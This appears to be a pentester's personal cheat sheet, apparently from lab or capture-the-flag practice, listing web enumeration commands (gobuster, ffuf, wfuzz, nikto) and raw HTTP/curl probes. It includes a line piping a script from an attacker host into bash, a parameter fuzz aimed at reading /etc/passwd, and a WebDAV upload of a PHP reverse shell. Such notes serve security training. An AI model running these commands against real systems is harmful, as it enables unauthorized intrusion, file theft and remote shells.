```
echo -ne "GET / HTTP/1.1\r\nHost: google.com\r\nConnection: close\r\n\r\n"
```

![](Pasted%20image%2020230923182239.png)

```
GET / HTTP/1.1\r\n
Host: google.com\r\n
Connection: close\r\n\r\n
```

```
\r (carriage return or 0x0d)
\n (new line or 0x0a)
```

```
nikto -h url
```

dirbuster
gobuster
feroxbuster

```
searchsploit mod ssl 2
```

```
dirb url
```

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u 'url/FUZZ' -k
```

```
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t
5
```

```
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

```
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w
/usr/share/wordlists/dirb/small.txt
```

```
gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
```

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt --url http://academy.htb/ -x .php, .txt -o gobuster-result.txt
```

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php -u http://academy.htb -o gobuster-dir-root.log
```

```
gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt | tee enum/gobuster-dir-p80.log
```

```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://academy.htb -o gobuster-vhost-sub.txt
```

```
grep \.git /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

![](Pasted%20image%2020231014122728.png)

```
curl -v 'url' -X POST --data '<key><value>>please</value></key>\n' -H 'Content-Type:application/xml'
```

```
curl -v 'url' -X POST --data '{"key": "please"}' -H 'Content-Type:application/json' --trace-ascii -
```

```
curl -v 'url' -X POST --data 'key: please' -H 'Content-Type:application/yaml' --trace-ascii -
```

```
curl attackerIP:8000/linpeas.sh | bash
```

```
python3 -m http.server
```

https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz

```
wfuzz -u http://192.168.237.104/file.php?FUZZ=/etc/passwd --hw 14 -w /usr/share/wordlists/dirb/big.txt
```

```
wfuzz -u http://192.168.237.104/file.php?FUZZ=/etc/passwd --hw 14 -w /usr/share/wordlists/dirb/big.txt
```

### Directory & Files Bruteforce

*Filter by whitelisting codes*

```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200,202,204,301,302,307,403 http://example.com/uploads/FUZZ
```

```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://vulnerable.site/FUZZ
```

```
cadaver http://ip/directory/

put /var/www/html/php-reverse-shell.php
```

```
gobuster dns -d artcorp.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -q -r 8.8.8.8 -t 4 --delay 1s -o subdomains.txt
```
